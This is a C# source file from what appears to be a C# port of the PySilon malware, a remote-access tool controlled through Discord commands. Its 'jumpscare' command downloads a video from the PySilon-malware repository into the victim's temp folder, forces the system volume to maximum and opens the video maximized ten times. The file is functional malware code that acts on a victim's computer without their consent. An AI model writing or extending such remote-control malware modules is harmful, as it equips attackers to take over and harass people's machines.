using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Discord.Commands;
using Discord.WebSocket;
using System.Threading.Tasks;
using AudioSwitcher.AudioApi.CoreAudio;

namespace CSharpSilon.cmds
{
    public class JumpScare : ModuleBase<SocketCommandContext>
    {
        [Command("jumpscare")]
        public async Task Jumpscare()
        {
            if (!File.Exists($"{Environment.ExpandEnvironmentVariables("%temp%")}\\jumpscare.mp4"))
            {
                File.WriteAllBytes($"{Environment.ExpandEnvironmentVariables("%temp%")}\\jumpscare.mp4", new WebClient().DownloadData("https://github.com/mategol/PySilon-malware/raw/refs/heads/main/resources/icons/jumpscare.mp4"));
            }
            if (Audio.dpd == null)
            {
                Audio.dpd = new CoreAudioController().DefaultPlaybackDevice;
            }

            Audio.dpd.Volume = 100;
            for (int i = 0; i < 10; i++)
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = $"{Environment.ExpandEnvironmentVariables("%temp%")}\\jumpscare.mp4",
                    WindowStyle = ProcessWindowStyle.Maximized
                });
            }
        }
    }
}